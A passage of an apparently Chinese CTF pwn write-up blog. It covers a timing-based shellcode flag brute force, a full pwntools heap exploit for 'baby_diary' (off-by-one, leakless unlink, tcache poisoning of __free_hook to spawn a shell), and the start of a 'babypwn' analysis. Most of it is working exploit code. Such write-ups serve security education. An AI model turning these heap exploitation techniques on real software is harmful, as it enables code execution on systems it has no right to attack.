class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-4;ret&quot;</span>.<span class="built_in">format</span>(index,ch)</span><br><span class="line"></span><br><span class="line">    shellcode_x86 = asm(shellcode_x86,arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode_flag = asm(shellcode_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode = shellcode_x86 + <span class="number">0x29</span>*<span class="string">b&#x27;\x90&#x27;</span> + shellcode_flag</span><br><span class="line"></span><br><span class="line">    sl(shellcode)</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">127</span>):</span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    pwn(p,index,ch)</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    end=time.time()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">if</span> end-start&gt;<span class="number">1.5</span>:</span><br><span class="line">      a.append(ch)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  index = index + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baby_diary: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">664b</span>d170fa1869d1e8bae262af76385c91c3e97d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>整数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>负数溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index = input();</span><br><span class="line"><span class="keyword">if</span> ( check(index) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_list[index]);</span><br></pre></td></tr></table></figure>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk = chunk_list[index];</span><br><span class="line">size_list[index] = len;</span><br><span class="line"><span class="keyword">if</span> ( len )</span><br><span class="line">  chunk[len + <span class="number">1</span>] = (chunk[len + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) + code2(index);</span><br></pre></td></tr></table></figure>
<ul>
<li>可以控制 <code>chunk[len + 1]</code> 为 <code>0x0-0xf</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的核心点就是无泄露 unlink，对于所有的无泄漏 unlink 都可以考虑如下的堆风水：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<p>不过本题目有点特殊，在具体的堆风水在构建时需要作出微调，可以参考如下的泄露脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>最后调整一下堆风水，劫持 tcache attack 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./baby_diary1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x17D7)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data=<span class="string">&quot;\n&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; size:&quot;</span>,<span class="built_in">str</span>(size-<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot; content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x178</span>*<span class="string">&quot;\x00&quot;</span>+p64(<span class="number">0x211</span>)+p64(free_hook)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,p64(system))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babypwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">721</span>c84a30c78ecb82a98a6d484d884a502b54fd6, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 execve</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序在 edit 完后会将所有的 0x11 置空，但是没有限制范围：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change</span><span class="params">(<span class="keyword">char</span> *chunk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *chunk == <span class="number">0x11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *chunk = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++chunk;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 off-by-null 漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序的泄露模块需要逆向，先进行一波分析：</p>
